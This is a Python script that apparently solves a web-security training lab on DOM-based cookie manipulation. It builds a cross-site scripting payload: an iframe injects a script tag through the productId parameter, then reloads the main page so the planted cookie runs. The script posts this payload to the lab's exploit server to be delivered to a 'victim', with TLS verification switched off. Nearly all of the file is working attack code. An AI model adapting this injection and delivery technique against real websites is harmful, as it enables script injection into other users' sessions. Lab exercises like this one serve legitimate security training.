import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "DOM-based cookie manipulation"

def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Craft an iframe with the XSS payload in its src attribute and make its onload handler redirect the victim to the main page, triggering the XSS payload\n2. Deliver the exploit to the victim\n""")

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    url = url.rstrip('/')
    payload = f"""<iframe src="{url}/product?productId=1&'><script>print()</script>"  onload="if(!window.x)this.src='{url}';window.x=1;">"""

    data = {"responseBody": payload, "responseHead": response_head,
            "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit"}

    user_input = input("[?] Enter the exploit server URL: ").strip()
    string = f"'{user_input}'"

    try:
        r = requests.post(user_input.rstrip('/'), data,
                          verify=False, proxies=proxies)
        res = r.text
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
